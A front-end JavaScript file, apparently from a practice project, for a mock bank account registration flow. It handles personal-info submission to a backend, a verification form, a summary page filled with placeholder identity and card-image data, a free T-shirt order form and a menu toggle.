document.getElementById("personalInfoForm").addEventListener("submit", () => {
    const personalInfoForm = {
        firstName: document.getElementById("firstName").value,
        middleName: document.getElementById("middleName").value || "N/A", // Default to "N/A" if empty
        lastName: document.getElementById("lastName").value,
        accountType: document.getElementById("accountType").value,
        country: document.getElementById("country").value,
    };

    fetch("https://bank-backend-gold.herokuapp.com/api/users/register", { // Update endpoint to match your backend route
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(personalInfoForm),
    })
    .then(response => response.json())
    .then(data => {
        console.log("Data submitted successfully:", data);
        window.location.href = "page2.html"; // Navigate to next page after successful submission
    })
    .catch(error => console.error("Error:", error));
});

// Navigation function for buttons
function goToPage(page) {
  window.location.href = page;
}

// Form submission handler
document.getElementById('verificationForm').addEventListener('submit', function (e) {
  e.preventDefault();

  // Collect form data
  const formData = new FormData(this);

  // Debugging: Log form data to the console
  for (let [key, value] of formData.entries()) {
    console.log(`${key}: ${value}`);
  }

  // Redirect to the next page
  window.location.href = 'page5.html';
});

// Mock data from the previous pages (in a real app, this would come from session or backend)
const mockFormData = {
  fullName: "John Doe",
  email: "john.doe@example.com",
  phone: "123-456-7890",
  photoId: "Passport",
  proofOfAddress: "Utility Bill",
  creditCardFront: "credit_card_front.jpg",
  creditCardBack: "credit_card_back.jpg",
};

// Populate summary data
function populateSummary() {
  document.getElementById("fullNameDisplay").textContent = mockFormData.fullName;
  document.getElementById("emailDisplay").textContent = mockFormData.email;
  document.getElementById("phoneDisplay").textContent = mockFormData.phone;
  document.getElementById("photoIdDisplay").textContent = mockFormData.photoId;
  document.getElementById("proofOfAddressDisplay").textContent = mockFormData.proofOfAddress;
  document.getElementById("creditCardFrontDisplay").textContent = mockFormData.creditCardFront;
  document.getElementById("creditCardBackDisplay").textContent = mockFormData.creditCardBack;
}

// Call populateSummary when the page loads
document.addEventListener("DOMContentLoaded", populateSummary);

// Confirm button click handler
document.getElementById("confirmButton").addEventListener("click", function () {
  // Simulate sending data to the backend
  console.log("Data sent to backend:", mockFormData);

  // Notify the user and redirect
  alert("Your account has been successfully created!");
  window.location.href = "success.html";
});

document.getElementById("giftForm").addEventListener("submit", function (e) {
  const selectedSize = document.querySelector('input[name="size"]:checked').value;
  console.log("Selected T-Shirt Size:", selectedSize);

  // Allow form submission
  alert(`Your order for a free T-Shirt (Size: ${selectedSize}) has been placed!`);
});

// Responsive menu toggle
const menuToggle = document.getElementById('mobile-menu');
const navList = document.querySelector('.nav-list');

menuToggle.addEventListener('click', () => {
    navList.classList.toggle('active');
});
